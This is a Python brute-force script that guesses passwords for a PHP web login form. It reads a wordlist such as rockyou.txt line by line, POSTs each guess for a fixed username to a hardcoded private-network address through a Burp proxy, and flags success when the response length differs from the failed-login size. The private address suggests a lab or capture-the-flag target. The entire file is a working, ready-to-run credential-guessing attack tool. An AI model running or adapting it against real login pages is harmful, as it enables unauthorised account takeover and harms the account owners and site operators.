# -*- coding: utf-8 -*
from __future__ import print_function
import requests
import sys
import linecache
import subprocess
import sys


#made in python2, kalilinux 2020.4

#usage of this code#
#python <this python script> <username> <password file> <starting line number of wordlist>
#python <this python script> frank /usr/share/wordlist/rockyou.txt 0

#How does this works ?
#Identify the bytes value of FAILED login, replace the 516 number with this identified value

### sending to Burp Proxy ###
proxies = {"http" : "http://127.0.0.1:8080","https" : "https://127.0.0.1:8080"}
### sending to Burp Proxy ###

###cookie value new


def file_len(fname):
	p = subprocess.Popen(['wc', '-l', fname], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	result, err = p.communicate()
	if p.returncode != 0:
		raise IOError(err)
	return int(result.strip().split()[0])

print("\n¯¯¯¯¯¯¯\_(ツ)_/¯¯¯¯¯¯¯ *** BruteForce Script*** ¯¯¯¯¯¯¯\_(ツ)_/¯¯¯¯¯¯¯\n")

if (len(sys.argv) == 4):
	inputUser=str(sys.argv[1])
	inputPasswordFile=str(sys.argv[2])
	TotalLines = str (file_len(inputPasswordFile))

	print("Total number of lines in wordlist file are = " + str(TotalLines))
	loop1 = 1

	while (loop1 <= int(TotalLines)):
		url = "http://192.168.10.15:1337/978345210/index.php"
		inputPassword = linecache.getline(inputPasswordFile, loop1)
		inputPassword=inputPassword.rstrip()
		payload = "username="+str(inputUser)+"&password="+str(inputPassword)+"&submit=+Login+"
		headers = { "Origin": "http://192.168.10.15:1337", 
		"Cookie": "PHPSESSID=v412vhmgpu6u34huoaxr50g052", 
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", 
		"Connection": "close", 
		"Referer": "http://192.168.10.15:1337/978345210/index.php", 
		"Host": "192.168.10.15:1337", 
		"Accept-Encoding": "gzip, deflate", 
		"Upgrade-Insecure-Requests": "1", 
		"Accept-Language": "en-US,en;q=0.5", 
		"Content-Length": "47", 
		"Content-Type": "application/x-www-form-urlencoded"
		}
		
		#without proxy
		#response = requests.request("POST", url, data=payload, headers=headers)
		
		#with proxy
		response = requests.request("POST", url, data=payload, headers=headers,proxies=proxies)
		
		#print(str(len(response.content)))
		#print("\nReq# "+str(loop1)+" The user was= "+inputUser+" and the password was= "+inputPassword+" The length of response was= "+str(len(response.content)))
		#loop1=loop1+1
		
		
		if (len(response.content) != 516): #change ME
			print("\nReq# "+str(loop1)+" The user was = "+inputUser+" and the password was = "+inputPassword+". The length of response was = "+str(len(response.content)))
			print("\nIam closing now")
			sys.exit()
		else:
			tempString="Req# "+str(loop1)+" I think request failed as response length was exact 516"
			tempString2= str(inputUser)+":"+str(inputPassword)
			sys.stdout.write('\r'+str(tempString))
			sys.stdout.flush()
			#sys.stdout.write('\r'+str(tempString2))
			#sys.stdout.flush()
			
		loop1=loop1+1
else:
	print ("\n !!! Problem Found !!!")
	print ("\nCorect syntax ---> #python <this script.py> <username> <password file> <starting location of wordlist>")
	print ("\n$python <this script.py> frank /usr/share/wordlist/rockyou.txt 0")

